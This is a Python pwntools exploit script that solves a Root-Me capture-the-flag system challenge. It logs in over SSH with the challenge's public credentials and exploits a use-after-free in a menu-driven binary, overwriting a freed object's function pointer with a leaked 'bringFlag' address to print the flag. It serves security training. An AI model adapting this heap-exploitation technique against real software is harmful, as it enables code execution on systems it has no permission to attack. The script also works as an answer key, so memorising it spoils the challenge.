from pwn import *
import base64

def read(sh):
    return sh.recv(1024, timeout=2)


s = ssh(host='challenge03.root-me.org', user='app-systeme-ch63', password='app-systeme-ch63', port=2223)
sh = s.process('/challenge/app-systeme/ch63/ch63')

# Read the output of binary
print read(sh)

# Buy a dog, name him aaaaaaaaaa
sh.sendline('1')
sh.sendline('a'*12)

print read(sh)

# Buy a doghouse, give address and name as something we dont care
sh.sendline('5')
sh.sendline('x')
sh.sendline('y')

print read(sh)

# Give the house to the dog
sh.sendline('6')
ret = read(sh)

bark = ret[12:16]
bringFlag = ret[16:20]
death = ret[20:24]

# Break house and kill the dog
sh.sendline('7')
sh.sendline('4')

print read(sh)

# Create a new house with bringFlag address for later call instead of bark
sh.sendline('5')
sh.sendline('a'*12 + bringFlag)
sh.sendline('y')

print read(sh)

# call bark -> get flag
sh.sendline('2')
print 'Flag is ' + sh.recvline()

s.close()
